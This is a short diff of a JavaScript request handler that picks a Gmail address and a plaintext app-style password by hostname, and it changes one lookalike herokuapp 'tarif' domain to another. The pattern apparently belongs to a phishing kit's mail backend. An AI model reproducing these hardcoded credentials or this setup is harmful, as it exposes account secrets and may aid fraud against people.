@@ -20,7 +20,7 @@ export default function handler(req, res) {
         email = 'brigacor80@gmail.com';
         pass = 'zhzcfhbdtzipldsz';
         
-    } else if(url == 'per-ubahan-tarif.herokuapp.com'){
+    } else if(url == 'tarif-perubah-an.herokuapp.com'){
         email = 'qqq66195@gmail.com';
         pass = 'gsnyrcjtylrepjdg';
 
